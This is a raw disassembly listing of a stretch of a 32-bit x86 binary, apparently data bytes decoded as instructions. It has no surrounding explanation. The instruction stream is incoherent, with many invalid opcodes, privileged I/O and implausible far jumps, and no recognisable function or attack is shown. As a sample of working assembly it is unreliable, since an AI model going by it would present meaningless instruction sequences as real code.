  4089b0:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4089b2:	push   edx
  4089b3:	rcr    DWORD PTR [esi+edi*8],0x98
  4089b7:	fld    TBYTE PTR [eax]
  4089b9:	arpl   sp,si
  4089bb:	jns    0x4089a7
  4089bd:	xchg   ebx,eax
  4089be:	out    0x1a,al
  4089c0:	rcr    DWORD PTR [edi-0x585cb3fd],1
  4089c6:	std    
  4089c7:	adc    ebx,DWORD PTR [esi-0x44]
  4089ca:	out    dx,eax
  4089cb:	je     0x4089cc
  4089cd:	aaa    
  4089ce:	and    al,0x99
  4089d0:	cmp    eax,0x1c69d91
  4089d5:	pop    edi
  4089d6:	(bad)  
  4089d7:	push   edx
  4089d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089d9:	jnp    0x408994
  4089db:	int    0x37
  4089dd:	xor    eax,0x5c8bcf92
  4089e2:	push   edx
  4089e3:	fdiv   QWORD PTR [edi+0x4ef18621]
  4089e9:	jp     0x4089d5
  4089eb:	xchg   ebp,eax
  4089ec:	mov    ebp,0x9a96c78d
  4089f1:	push   ebx
  4089f2:	push   edi
  4089f3:	and    esi,DWORD PTR [ecx*2-0x1dcd119e]
  4089fa:	test   eax,0xc6ca88e
  4089ff:	jecxz  0x4089e4
  408a01:	xchg   ebp,eax
  408a02:	jnp    0x408a53
  408a04:	rcl    esp,cl
  408a06:	test   BYTE PTR [ecx+0x66],ah
  408a09:	cs cmc 
  408a0b:	test   BYTE PTR [ebx],0x72
  408a0e:	fidivr DWORD PTR [edi]
  408a10:	xor    eax,0xdeeb99e5
  408a15:	cmp    BYTE PTR [edi-0x7d],dh
  408a18:	pusha  
  408a19:	jno    0x4089ab
  408a1b:	pop    ss
  408a1c:	mov    edx,0x59bdb7
  408a21:	jbe    0x4089a6
  408a23:	inc    edx
  408a24:	repnz sbb BYTE PTR [edi],ch
  408a27:	mov    ebx,0x943836b4
  408a2c:	mov    ah,0x30
  408a2e:	(bad)  
  408a2f:	cwde   
  408a30:	loope  0x408aa2
  408a32:	cmc    
  408a33:	sub    bl,al
  408a35:	inc    ebp
  408a36:	inc    edi
  408a37:	jne    0x4089de
  408a39:	xchg   ebx,eax
  408a3a:	add    bh,BYTE PTR [si]
  408a3d:	pop    DWORD PTR [ebp+0x4bca7ea2]
  408a43:	xor    ah,al
  408a45:	mov    edi,0xe3f36d92
  408a4a:	xchg   edx,eax
  408a4b:	sub    DWORD PTR [ebx-0x2a],0x39bc467e
  408a52:	imul   esp,edx,0xffffff8c
  408a55:	retf   
  408a56:	jo     0x4089de
  408a58:	push   cs
  408a59:	loope  0x408ab9
  408a5b:	and    ah,BYTE PTR [esi+0x5b318fd4]
  408a61:	xor    eax,0xd5069982
  408a66:	ja     0x4089f0
  408a68:	add    eax,0x5ba7dc3d
  408a6d:	icebp  
  408a6e:	and    al,0x9c
  408a70:	rol    DWORD PTR [edi-0x571e0cf5],1
  408a76:	sbb    BYTE PTR ds:[ecx+edx*2+0x63922393],ah
  408a7e:	lods   al,BYTE PTR ds:[esi]
  408a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a80:	stos   BYTE PTR es:[edi],al
  408a81:	xor    eax,0x5979a5bb
  408a86:	cli    
  408a87:	or     dl,bh
  408a89:	call   0x7588:0xf787c5ef
  408a90:	sbb    al,0x21
  408a93:	jecxz  0x408a8e
  408a95:	stos   DWORD PTR es:[edi],eax
  408a96:	stos   BYTE PTR es:[edi],al
  408a97:	ds scas al,BYTE PTR es:[edi]
  408a99:	sar    DWORD PTR [ebx],1
  408a9b:	fldz   
  408a9d:	cmp    eax,0xd23f48a1
  408aa2:	and    DWORD PTR [edx+0xc],0xcaea1f46
  408aa9:	and    bh,BYTE PTR [esi]
  408aab:	xlat   BYTE PTR ds:[ebx]
  408aac:	and    eax,0xe888adba
  408ab1:	xor    dh,BYTE PTR [ebx+ebx*4+0x58]
  408ab5:	sub    dh,BYTE PTR [ebx-0x130b0413]
  408abb:	loopne 0x408af5
  408abd:	push   0xffffffa4
  408abf:	cli    
  408ac0:	jmp    0x408ab7
  408ac2:	mov    ch,0xfb
  408ac4:	shl    bh,cl
  408ac6:	pusha  
  408ac7:	pushf  
  408ac8:	rol    BYTE PTR [eax-0x39],cl
  408acb:	mov    edi,0x339d2b86
  408ad0:	lock in al,dx
  408ad2:	jmp    0x408a69
  408ad4:	fwait
  408ad5:	push   esp
  408ad6:	and    ebp,DWORD PTR [ecx-0x63031e4b]
  408adc:	test   BYTE PTR [eax+ebp*8-0x42],ch
  408ae0:	(bad)  
  408ae1:	sub    eax,0xd5149665
  408ae6:	pushf  
  408ae7:	int3   
  408ae8:	je     0x408a85
  408aea:	jb     0x408b22
  408aec:	and    DWORD PTR [edx+ebx*8-0x1ad2acdb],ebx
  408af3:	mov    ah,0xea
  408af5:	adc    dl,BYTE PTR [ebp-0x59]
  408af8:	xor    eax,0xa83aa06b
  408afd:	dec    esi
  408afe:	fnstcw WORD PTR [edi]
  408b00:	mov    esp,DWORD PTR [ecx+0x7ed8c79c]
  408b06:	inc    ecx
  408b07:	push   edi
  408b08:	outs   dx,DWORD PTR ds:[esi]
  408b09:	add    eax,0x8d9d977a
  408b0e:	jae    0x408b85
  408b10:	jle    0x408af4
  408b12:	inc    ebx
  408b13:	add    eax,0x61981162
  408b18:	cdq    
  408b19:	into   
  408b1a:	jmp    0x2087dff1
  408b1f:	cs daa 
  408b21:	bound  ebp,QWORD PTR [edi-0x36]
  408b24:	add    cl,BYTE PTR [ecx*8+0x331f697]
  408b2b:	jno    0x408b18
  408b2d:	hlt    
  408b2e:	mov    dl,0x51
  408b30:	push   edi
  408b31:	pop    esi
  408b32:	ins    DWORD PTR es:[edi],dx
  408b33:	cmp    eax,0x69d182a7
  408b38:	xor    BYTE PTR [eax],dl
  408b3a:	push   ss
  408b3b:	dec    esi
  408b3c:	or     eax,0x4744187b
  408b41:	and    esp,ebx
  408b43:	add    cl,ah
  408b45:	fst    DWORD PTR [edx+eax*1]
  408b48:	xor    DWORD PTR [edi+0x2c],edi
  408b4b:	pop    edx
  408b4c:	or     eax,0xd8295686
  408b51:	iret   
  408b52:	pop    esp
  408b53:	retf   0x1fae
  408b56:	retf   
  408b57:	pusha  
  408b58:	dec    eax
  408b59:	add    al,ch
  408b5b:	pop    ebp
  408b5c:	cwde   
  408b5d:	sbb    esp,0xffffff9c
  408b60:	add    DWORD PTR [edx+0x1],0x82e19ab0
  408b67:	leave  
  408b68:	jle    0x408b02
  408b6a:	ja     0x408af4
  408b6c:	fcomp  QWORD PTR [edx+esi*1-0x1248f8c2]
  408b73:	or     DWORD PTR [ebp+0x6],eax
  408b76:	or     esi,edx
  408b78:	(bad)  
  408b79:	and    al,0xd9
  408b7b:	push   ss
  408b7c:	xchg   edi,eax
  408b7d:	mov    eax,0x35b83bac
  408b82:	(bad)  
  408b83:	sub    al,0xd3
  408b85:	fst    QWORD PTR [edi+0x596b90b]
  408b8b:	xchg   BYTE PTR [ecx+ebp*4],bh
  408b8e:	ins    DWORD PTR es:[edi],dx
  408b8f:	sbb    BYTE PTR [eax],bh
  408b91:	paddsb mm2,QWORD PTR [ebx]
  408b94:	dec    ecx
  408b95:	mov    ecx,0xaef25451
  408b9a:	test   eax,0x3bd02980
  408b9f:	je     0x408bd7
  408ba1:	sub    al,0x98
  408ba3:	(bad)  
  408ba5:	xchg   BYTE PTR [ebp+0x4a],al
  408ba8:	adc    DWORD PTR [ebp+0x4edf6ed1],ebx
  408bae:	sbb    eax,0xb7d4ff6
  408bb3:	stos   BYTE PTR es:[edi],al
  408bb4:	pop    esp
  408bb5:	std    
  408bb6:	push   ss
  408bb7:	inc    esp
  408bb8:	xchg   ebx,eax
  408bb9:	adc    al,0x1e
  408bbb:	pop    eax
  408bbc:	push   ecx
  408bbd:	rol    BYTE PTR [edx+0xc],0xb8
  408bc1:	pop    es
  408bc2:	dec    esp
  408bc3:	push   esp
  408bc4:	inc    esi
  408bc5:	das    
  408bc6:	(bad)  
  408bc8:	mov    DWORD PTR [ebx-0x7f],esi
  408bcb:	mov    DWORD PTR [ecx],edi
  408bcd:	dec    ebx
  408bce:	loope  0x408bf5
  408bd0:	fbstp  TBYTE PTR [edi-0x6612a09]
  408bd6:	lahf   
  408bd7:	icebp  
  408bd8:	mov    eax,ds:0xe5b5d0ad
  408bdd:	add    al,0x2c
  408bdf:	call   0xbb5f34b2
  408be4:	scas   eax,DWORD PTR es:[edi]
  408be5:	dec    ecx
  408be6:	xchg   DWORD PTR [edi-0x29f9d25c],esp
  408bec:	stc    
  408bed:	fsub   DWORD PTR [edi-0x70e19eee]
  408bf3:	aas    
  408bf4:	outs   dx,BYTE PTR ds:[esi]
  408bf5:	mov    DWORD PTR [esi+0x5684d85e],ebx
  408bfb:	jbe    0x408bb8
  408bfd:	std    
  408bfe:	add    edx,DWORD PTR ss:[ebp-0x56]
  408c02:	sub    al,0x39
  408c04:	mov    dl,0x13
  408c06:	and    esi,DWORD PTR [ebp-0x7075e5e1]
  408c0c:	test   bl,dh
  408c0e:	aad    0xb3
  408c10:	test   DWORD PTR [ebp-0x265aaafd],ebx
  408c16:	(bad)  
  408c17:	call   0xac44:0x2f65f825
  408c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c1f:	jb     0x408bb9
  408c21:	loope  0x408c73
  408c23:	stos   BYTE PTR es:[edi],al
  408c24:	retf   
  408c25:	pop    esp
  408c26:	test   DWORD PTR [esi],edx
  408c28:	push   es
  408c29:	shl    BYTE PTR [ecx],cl
  408c2b:	aaa    
  408c2c:	in     eax,0x3a
  408c2e:	into   
  408c2f:	mov    ebx,0x503b6c10
  408c34:	cmp    BYTE PTR [eax+eiz*4+0x23],bl
  408c38:	jo     0x408c76
  408c3a:	xchg   esi,eax
  408c3b:	and    al,0x3c
  408c3d:	sbb    DWORD PTR [ecx+0x7358c151],0xe0860b87
  408c47:	push   0xabd8e29b
  408c4c:	xchg   ecx,eax
  408c4d:	popf   
  408c4e:	jb     0x408bee
  408c50:	add    bl,0xc9
  408c53:	jge    0x408be6
  408c55:	cdq    
  408c56:	xor    DWORD PTR [eax],ebx
  408c58:	mov    eax,0xef6e595f
  408c5d:	dec    eax
  408c5e:	inc    esp
  408c5f:	fild   DWORD PTR [ecx]
  408c61:	in     eax,0x97
  408c63:	xchg   esi,eax
  408c64:	ins    BYTE PTR es:[edi],dx
  408c65:	mov    esi,0x7a697d47
  408c6a:	push   eax
  408c6b:	jmp    0x408cbe
  408c6d:	jge    0x408c68
  408c6f:	cld    
  408c70:	(bad)  
  408c71:	xchg   esp,eax
  408c72:	fwait
  408c73:	sub    cl,BYTE PTR [ebx+0x16]
  408c76:	cmp    eax,0xe7a64060
  408c7b:	nop
  408c7c:	pop    ecx
  408c7d:	retf   
  408c7e:	inc    edx
  408c7f:	inc    edi
  408c80:	fptan  
  408c82:	out    0x94,al
  408c84:	sbb    DWORD PTR [eax+0x77],esp
  408c87:	cmp    DWORD PTR [eax-0x76d086e3],eax
  408c8d:	jmp    0xd27342f8
  408c92:	hlt    
  408c93:	xor    esi,DWORD PTR [esi-0x68]
  408c96:	mov    ah,0xed
  408c98:	pop    ebx
  408c99:	push   0x9de5f0a6
  408c9e:	pushf  
  408c9f:	xchg   ebp,eax
  408ca0:	push   ecx
  408ca1:	mov    dl,0x65
  408ca3:	popa   
  408ca4:	iret   
  408ca5:	pop    ds
  408ca6:	aaa    
  408ca7:	pushf  
  408ca8:	dec    esp
  408ca9:	std    
  408caa:	fisub  DWORD PTR [eax]
  408cac:	and    al,BYTE PTR [edx-0x46d674]
  408cb2:	and    BYTE PTR [ebp+0x54],dh
  408cb5:	pop    ds
  408cb6:	dec    DWORD PTR [eax-0x5ba7634d]
  408cbc:	(bad)  
  408cbd:	xor    edi,DWORD PTR [edx]
  408cbf:	xchg   ecx,eax
  408cc0:	mov    dh,0x77
  408cc2:	sub    cl,BYTE PTR [edx]
  408cc4:	dec    DWORD PTR [edi-0x7eddc88c]
  408cca:	xchg   ebp,eax
  408ccb:	push   0x57
  408ccd:	jns    0x408cb4
  408ccf:	(bad)  
  408cd0:	cmc    
  408cd1:	xlat   BYTE PTR ds:[ebx]
  408cd2:	jmp    0xb433b846
  408cd7:	jns    0x408c84
  408cd9:	fdiv   st(0),st
  408cdb:	sbb    DWORD PTR ds:0xe8bfedc,edx
  408ce1:	jns    0x408c90
  408ce3:	movups xmm2,XMMWORD PTR [edi-0x61c84289]
  408cea:	fbld   TBYTE PTR [ecx]
  408cec:	adc    eax,0xa69f9d5a
  408cf1:	cwde   
  408cf2:	je     0x408c7e
  408cf4:	cmp    edx,0x3707bd1e
  408cfa:	leave  
  408cfb:	sbb    DWORD PTR cs:[edi],esi
  408cfe:	adc    eax,0x9cd96cbe
  408d03:	xchg   ecx,eax
  408d04:	in     eax,0x75
  408d06:	dec    ebp
  408d07:	repz sub eax,0xf64f1c75
  408d0d:	adc    al,0xe3
  408d0f:	jl     0x408d33
  408d11:	push   0xd67ec069
  408d16:	and    ebx,0xc906923f
  408d1c:	xchg   DWORD PTR [esi],ebp
  408d1e:	fbstp  TBYTE PTR [ebx]
  408d20:	inc    esp
  408d21:	gs jb  0x408d6a
  408d24:	dec    edi
  408d25:	mov    BYTE PTR [edi],ah
  408d27:	add    DWORD PTR [edx-0x7e],ebx
  408d2a:	bnd jl 0x408d29
  408d2d:	repnz iret 
  408d2f:	sbb    DWORD PTR [ecx-0x67],0xfffffffb
  408d33:	imul   edi,DWORD PTR [edi+0x449df4fe],0x959de57b
  408d3d:	or     DWORD PTR [ebp-0x14],edi
  408d40:	aaa    
  408d41:	lods   eax,DWORD PTR ds:[esi]
  408d42:	pop    ebx
  408d43:	add    ch,BYTE PTR [eax-0x3a8e6c07]
  408d49:	aad    0x6f
  408d4b:	in     al,dx
  408d4c:	add    DWORD PTR [ebx+ebp*1-0x703908f],edx
  408d53:	scas   eax,DWORD PTR es:[edi]
  408d54:	cmp    al,0xeb
  408d56:	ror    DWORD PTR [ebp+0x4d0a4c47],1
  408d5c:	fldenv ds:0x694dc733
  408d62:	lods   al,BYTE PTR ds:[esi]
  408d63:	mov    bl,0x27
  408d65:	frstor [ebx+0x76]
  408d68:	cmc    
  408d69:	xchg   ebp,eax
  408d6a:	mov    edi,0x12b5a751
  408d6f:	cmp    ch,al
  408d71:	test   DWORD PTR [esi+0x3f753d01],ecx
  408d77:	outs   dx,DWORD PTR ds:[esi]
  408d78:	mov    edi,DWORD PTR [esi+0x4a]
  408d7b:	call   DWORD PTR [ecx+0x480d47e2]
  408d81:	imul   ebx,DWORD PTR [edx+0x400b0b1e],0x4ecabb94
  408d8b:	or     al,0x2b
  408d8d:	lods   eax,DWORD PTR ds:[esi]
  408d8e:	(bad)  
  408d8f:	or     al,BYTE PTR [edi]
  408d91:	add    bl,bl
  408d93:	add    eax,0x5d5d236
  408d98:	out    0xbf,al
  408d9a:	enter  0xfca4,0xb1
  408d9e:	outs   dx,BYTE PTR ds:[esi]
  408d9f:	mov    al,0x1b
  408da1:	ins    BYTE PTR es:[edi],dx
  408da2:	sub    DWORD PTR [ecx-0x47],0x8a8aa592
  408da9:	jle    0x408da9
  408dab:	mov    dl,BYTE PTR [edi+0x4dc39d0b]
  408db1:	leave  
  408db2:	mov    eax,ds:0xc66bb6d1
  408db7:	adc    eax,edi
  408db9:	sbb    BYTE PTR [edx-0x44],0x8c
  408dbd:	les    eax,FWORD PTR [edi+edx*8+0xbfe3cf]
  408dc4:	aaa    
  408dc5:	jo     0x408e1e
  408dc7:	xchg   ebp,eax
  408dc8:	jge    0x408d6d
  408dca:	push   esi
  408dcb:	ret    0x11a8
  408dce:	adc    ah,dl
  408dd0:	pop    ebx
  408dd1:	je     0x408d90
  408dd3:	jne    0x408dea
  408dd5:	push   0xffffff99
  408dd7:	jmp    0x408d7b
  408dd9:	(bad)  
  408dda:	ins    DWORD PTR es:[edi],dx
  408ddb:	cmp    al,bh
  408ddd:	adc    BYTE PTR [esi+0x29dff943],dl
  408de3:	add    eax,0xf43eed38
  408de8:	jb     0x408e53
  408dea:	bound  ebp,QWORD PTR [eax+0x11]
  408ded:	cmp    ebx,ecx
  408def:	daa    
  408df0:	daa    
  408df1:	fiadd  DWORD PTR [esp+eax*8-0x25]
  408df5:	cmp    BYTE PTR [ebp+edx*4+0x59120871],cl
  408dfc:	mov    dh,0xca
  408dfe:	nop
  408dff:	inc    edi
  408e00:	cwde   
  408e01:	out    dx,al
  408e02:	fldenv [ebx]
  408e04:	mov    eax,0x8c36d294
  408e09:	ffreep st(7)
  408e0b:	sub    al,0xbd
  408e0d:	add    edx,eax
  408e0f:	fidivr WORD PTR [ecx]
  408e11:	xchg   DWORD PTR [ecx],edx
  408e13:	outs   dx,WORD PTR gs:[esi]
  408e16:	cmpxchg DWORD PTR [bx],eax
  408e1a:	inc    eax
  408e1b:	rcr    BYTE PTR [ebx],0xdc
  408e1e:	jle    0x408e91
  408e20:	in     al,dx
  408e21:	lods   eax,DWORD PTR ds:[esi]
  408e22:	sbb    eax,0x34f1b279
  408e27:	mov    eax,ds:0xb38f9965
  408e2c:	ins    DWORD PTR es:[edi],dx
  408e2d:	or     esi,edx
  408e2f:	pusha  
  408e30:	pop    esi
  408e31:	into   
  408e32:	lds    ebx,FWORD PTR [eax-0x776993d3]
  408e38:	mov    ah,bh
  408e3a:	into   
  408e3b:	ret    
  408e3c:	enter  0x8427,0x85
  408e40:	sub    ch,BYTE PTR [edi+esi*2-0x79b36de9]
  408e47:	push   ebx
  408e48:	je     0x408e17
  408e4a:	out    dx,al
  408e4b:	sub    esi,DWORD PTR [ecx]
  408e4d:	sbb    eax,0xd3cc217
  408e52:	push   es
  408e53:	add    cl,BYTE PTR [esi+0xcde8d7c]
  408e59:	lahf   
  408e5a:	ins    BYTE PTR es:[edi],dx
  408e5b:	adc    DWORD PTR [edx-0x5a29aa9c],0xf28c7b9
  408e65:	hlt    
  408e66:	sbb    DWORD PTR [ebp-0x41363863],edx
  408e6c:	sub    eax,DWORD PTR [eax]
  408e6e:	mov    esi,0x5323cfbc
  408e73:	sub    bh,ch
  408e75:	popa   
  408e76:	pop    ebp
  408e77:	(bad)  
  408e78:	jns    0x408e31
  408e7a:	dec    ecx
  408e7b:	mov    bh,0xfe
  408e7d:	scas   eax,DWORD PTR es:[edi]
  408e7e:	std    
  408e7f:	pop    ds
  408e80:	pop    ds
  408e81:	je     0x408eff
  408e83:	push   eax
  408e84:	es cli 
  408e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e87:	jle    0x408e3d
  408e89:	add    BYTE PTR [ebx-0xb],cl
  408e8c:	xchg   ebp,eax
  408e8d:	cmc    
  408e8e:	int    0x64
  408e90:	js     0x408e55
  408e92:	(bad)  
  408e93:	cmp    ch,ah
  408e95:	loopne 0x408e66
  408e97:	ins    BYTE PTR es:[edi],dx
  408e98:	cmp    DWORD PTR [edi+0x4d],esi
  408e9b:	daa    
  408e9c:	or     ecx,esp
  408e9e:	(bad)  
  408e9f:	and    esp,DWORD PTR [edx+0x525e364b]
  408ea5:	push   0xffd11cd
  408eaa:	cmp    DWORD PTR [edx+edi*4+0x43],0xc
  408eaf:	xchg   ebx,eax
  408eb0:	aad    0xc5
  408eb2:	pop    ebp
  408eb3:	in     al,dx
  408eb4:	xchg   esi,eax
  408eb5:	xlat   BYTE PTR ds:[ebx]
  408eb6:	adc    ebp,DWORD PTR [ebx+0x75]
  408eb9:	xlat   BYTE PTR ds:[ebx]
  408eba:	add    bh,BYTE PTR [esi+0x44]
  408ebd:	cmc    
  408ebe:	mov    cl,0x2b
  408ec0:	pop    eax
  408ec1:	ja     0x408eca
  408ec3:	dec    edx
  408ec4:	push   ecx
  408ec5:	xchg   ebx,eax
  408ec6:	adc    dl,bh
  408ec8:	inc    esi
  408ec9:	stc    
  408eca:	test   al,0xc3
  408ecc:	je     0x408f2b
  408ece:	mov    bl,BYTE PTR [ebp+0x11f37d0c]
  408ed4:	mov    gs,WORD PTR [esi+0x66bbf08c]
  408eda:	jp     0x408ed8
  408edc:	sbb    BYTE PTR [edi+0x5e],bh
  408edf:	enter  0x5f53,0x31
  408ee3:	test   eax,0x4c981fd7
  408ee8:	add    dh,BYTE PTR [edi+0x36]
  408eeb:	dec    eax
  408eec:	cs adc ebp,esi
  408eef:	rol    dh,cl
  408ef1:	data16 jbe 0x408f57
  408ef4:	mov    eax,ds:0xe2adf309
  408ef9:	rcr    BYTE PTR [ecx],cl
  408efb:	cmp    DWORD PTR [ecx+0xcc257e0],0x10
  408f02:	imul   eax,DWORD PTR [esi-0x2547ccce],0xd35f5bf6
  408f0c:	in     al,0x57
  408f0e:	repz cmp BYTE PTR [ebx+0x5ce3cb98],bh
  408f15:	aaa    
  408f16:	gs nop
  408f18:	cli    
  408f19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f1a:	sbb    BYTE PTR [edx+0x10585265],ch
  408f20:	and    DWORD PTR [ebx+0x12],ebp
  408f23:	std    
  408f24:	and    al,0x0
  408f26:	sub    edi,0x6dacc2d9
  408f2c:	mov    al,ds:0xb490cdd4
  408f31:	pop    esi
  408f32:	call   0x1118:0x70c85f7f
  408f39:	mov    edi,DWORD PTR [esi-0x52b2bad2]
  408f3f:	fadd   st,st(3)
  408f41:	fnstsw WORD PTR [ecx+0x64]
  408f44:	sub    ecx,DWORD PTR [ecx-0x34750f8d]
  408f4a:	jecxz  0x408f25
  408f4c:	rcr    BYTE PTR [eax+0x3],0xd4
  408f50:	pushf  
  408f51:	xor    BYTE PTR [ebx-0x39],dh
  408f54:	cmp    DWORD PTR [eax],edx
  408f56:	sahf   
  408f57:	dec    esi
  408f58:	shr    al,0x28
  408f5b:	aaa    
  408f5c:	std    
  408f5d:	arpl   WORD PTR [edi-0x25],ax
  408f60:	call   0x1d6c:0x1b6397bf
  408f67:	sub    BYTE PTR [edi-0x7f],0x91
  408f6b:	pop    eax
  408f6c:	es (bad) 
  408f70:	add    ecx,ecx
  408f72:	fwait
  408f73:	es xchg ebx,ebp
  408f76:	pop    ebx
  408f77:	es aad 0x54
  408f7a:	add    BYTE PTR [ebp-0x6489c975],cl
  408f80:	add    DWORD PTR [ecx-0x28b60ae3],ebp
  408f86:	sub    dh,al
  408f88:	icebp  
  408f89:	stos   DWORD PTR es:[edi],eax
  408f8a:	fwait
  408f8b:	add    eax,0xa876ead3
  408f90:	sub    bh,cl
  408f92:	test   BYTE PTR [ebx],ch
  408f94:	mov    edx,0x4d366a0b
  408f99:	fnstsw WORD PTR [eax-0x3d6f995b]
  408f9f:	retf   
  408fa0:	lea    esi,[ecx]
  408fa2:	add    DWORD PTR ss:[esi-0x1c401ffa],ebp
  408fa9:	mov    esp,0xafa562df
  408fae:	and    eax,0x87d7f2c9
  408fb3:	mov    ecx,0x35877fec
  408fb8:	jle    0x408ffa
  408fba:	in     al,dx
  408fbb:	dec    BYTE PTR [ecx+0x2120f4c2]
  408fc1:	cmp    dh,BYTE PTR [esi+edi*1-0x7f]
  408fc5:	out    dx,al
  408fc6:	sub    al,0xae
  408fc8:	and    al,0x3d
  408fca:	cmc    
  408fcb:	mov    ah,0xc5
  408fcd:	test   eax,0x1e20fb15
  408fd2:	push   0x43
  408fd4:	adc    al,0x4b
  408fd6:	mul    dl
  408fd8:	push   edx
  408fd9:	rol    BYTE PTR [esi-0x3e],0x84
  408fdd:	xor    eax,0xf4b7f77f
  408fe2:	cmp    BYTE PTR [esi-0x4e],0xf4
  408fe6:	fs (bad) 
  408fe8:	imul   ecx,DWORD PTR [ecx],0x41
  408feb:	into   
  408fec:	fnstcw WORD PTR [esi]
  408fee:	shl    BYTE PTR [edi-0x55505afd],1
  408ff4:	or     BYTE PTR [edi+esi*8],bh
  408ff7:	(bad)  
  408ff8:	mov    edx,0xe23659c0
  408ffd:	and    BYTE PTR [esi-0x5358ce03],bh
  409003:	add    ebx,0xffffffab
  409006:	mov    cs,ebx
  409008:	(bad)  
  40900a:	jae    0x408fa3
  40900c:	jmp    0x9f8d2240
  409011:	das    
  409012:	sub    BYTE PTR [ebp-0x456eb3d3],0xd0
  409019:	push   es
  40901a:	jl     0x409067
  40901c:	pop    ss
  40901d:	mov    ebp,0x92e21516
  409022:	jg     0x40909c
  409024:	hlt    
  409025:	mov    bl,0x18
  409027:	aad    0xdb
  409029:	sub    BYTE PTR [edx],cl
  40902b:	mov    DWORD PTR [ebx-0x71610f76],edx
  409031:	arpl   bx,si
  409033:	popf   
  409034:	icebp  
  409035:	push   ebp
  409036:	dec    ebx
  409037:	add    esp,DWORD PTR [ebx-0x113c8c6c]
  40903d:	(bad)  
  40903e:	or     esi,DWORD PTR [edi+ebp*1]
  409041:	aas    
  409042:	scas   al,BYTE PTR es:[edi]
  409043:	push   ebp
  409044:	(bad)  
  409045:	pop    esp
  409046:	pop    esp
  409047:	jne    0x409074
  409049:	inc    eax
  40904a:	sbb    cl,BYTE PTR [edi+0xa4d327b]
  409050:	test   DWORD PTR [esi+0x49],edx
  409053:	dec    eax
  409054:	arpl   sp,si
  409056:	xchg   BYTE PTR [esi-0x6],cl
  409059:	test   DWORD PTR [edx+0x18],edi
  40905c:	stos   DWORD PTR es:[edi],eax
  40905d:	push   0xba6332f7
  409062:	pop    eax
  409063:	cld    
  409064:	and    eax,0x96316b67
  409069:	ret    
  40906a:	xchg   edx,eax
  40906b:	and    eax,edi
  40906d:	sahf   
  40906e:	xor    cl,dl
  409070:	in     al,dx
  409071:	ins    BYTE PTR es:[edi],dx
  409072:	sbb    DWORD PTR [edi+0xb],esi
  409075:	daa    
  409076:	inc    ecx
  409077:	repz pop ds
  409079:	add    dl,0x85
  40907c:	inc    esi
  40907d:	stc    
  40907e:	sar    BYTE PTR [eax-0x25efd34d],cl
  409084:	repnz dec edi
  409086:	cld    
  409087:	ret    0xe8b
  40908a:	dec    edi
  40908b:	xchg   DWORD PTR [edx+0x16376263],edx
  409091:	dec    ecx
  409092:	jne    0x40904a
  409094:	mov    ebp,0x72177217
  409099:	or     eax,0x1d439f84
  40909e:	jae    0x4090c2
  4090a0:	dec    ecx
  4090a1:	rcl    DWORD PTR [ecx+0x10],1
  4090a4:	push   eax
  4090a5:	mov    ecx,esi
  4090a7:	and    ebx,DWORD PTR ds:0xca076528
  4090ad:	stos   DWORD PTR es:[edi],eax
  4090ae:	loope  0x409062
  4090b0:	inc    esi
  4090b1:	jl     0x4090dc
  4090b3:	idiv   ecx
  4090b5:	mov    ds:0x951ae1cd,eax
  4090ba:	xor    eax,0x2bbf5c5e
  4090bf:	jmp    0x4090b5
  4090c1:	imul   ebx,DWORD PTR [edx],0xffffffee
  4090c4:	loop   0x4090e5
  4090c6:	push   ds
  4090c7:	jnp    0x409147
  4090c9:	pop    ebp
  4090ca:	shl    BYTE PTR [ecx-0x54],0x58
  4090ce:	or     edi,esi
  4090d0:	inc    ebp
  4090d1:	xchg   esi,eax
  4090d2:	pop    ss
  4090d3:	cdq    
  4090d4:	or     ebx,0x7d
  4090d7:	jae    0x409130
  4090d9:	and    DWORD PTR [edi-0x2],ecx
  4090dc:	es mov dl,0x1b
  4090df:	jmp    0x64d:0xa17c7d54
  4090e6:	jne    0x40912a
  4090e8:	jl     0x4090e9
  4090ea:	adc    ecx,DWORD PTR [edi-0x30]
  4090ed:	shl    BYTE PTR [edx],1
  4090ef:	xchg   DWORD PTR [eax],ecx
  4090f1:	jle    0x409165
  4090f3:	mov    edx,DWORD PTR [eax+edi*2]
  4090f6:	jne    0x4090c4
  4090f8:	outs   dx,BYTE PTR ds:[esi]
  4090f9:	scas   al,BYTE PTR es:[edi]
  4090fa:	lea    ecx,[edx+0x29]
  4090fd:	or     DWORD PTR [ecx+0x11],0xffffffde
  409101:	cmp    al,0xc2
  409103:	(bad)  
  409105:	pop    es
  409106:	shl    dl,cl
  409108:	push   edi
  409109:	cmp    al,0xbb
  40910b:	shl    BYTE PTR [edi+0x43],0x39
  40910f:	mov    BYTE PTR [edx+esi*8-0x69],ah
  409113:	xchg   edi,eax
  409114:	jae    0x40911e
  409116:	sub    DWORD PTR [edx-0x28],edi
  409119:	sbb    BYTE PTR [esi+0x6ce77047],dh
  40911f:	cmp    edx,ecx
  409121:	jne    0x409188
  409123:	sub    eax,0x72cf9cf2
  409128:	sub    al,0xa0
  40912a:	(bad)  
  40912b:	xor    eax,0x3ec0bfd4
  409130:	or     BYTE PTR ds:0xed386da9,dl
  409136:	rol    BYTE PTR [eax+ebp*8],cl
  409139:	leave  
  40913a:	mov    dh,0xce
  40913c:	and    dh,BYTE PTR [ebp-0x30e4802a]
  409142:	xor    BYTE PTR [eax],bh
  409144:	std    
  409145:	push   ss
  409146:	outs   dx,DWORD PTR ds:[esi]
  409147:	sub    BYTE PTR [esp+ebx*8+0x71],al
  40914b:	cmc    
  40914c:	xchg   ebp,eax
  40914d:	js     0x409111
  40914f:	addr16 pop esi
  409151:	aaa    
  409152:	cmp    dh,BYTE PTR [ebx+0x7131cc5b]
  409158:	cmp    BYTE PTR [edx],bh
  40915a:	pop    esi
  40915b:	push   esp
  40915c:	jnp    0x40919e
  40915e:	and    DWORD PTR [esi],0x26179aa9
  409164:	push   edi
  409165:	data16 int3 
  409167:	bound  ebp,QWORD PTR [ebp-0x616da4d3]
  40916d:	or     dl,BYTE PTR [edi-0x102c1d57]
  409173:	lds    esi,FWORD PTR [ecx-0x32e8e2e7]
  409179:	inc    edx
  40917a:	mov    esi,0xd964f54f
  40917f:	(bad)  
  409180:	test   al,0x78
  409182:	scas   al,BYTE PTR es:[edi]
  409183:	fdivr  st(2),st
  409185:	ret    
  409186:	popa   
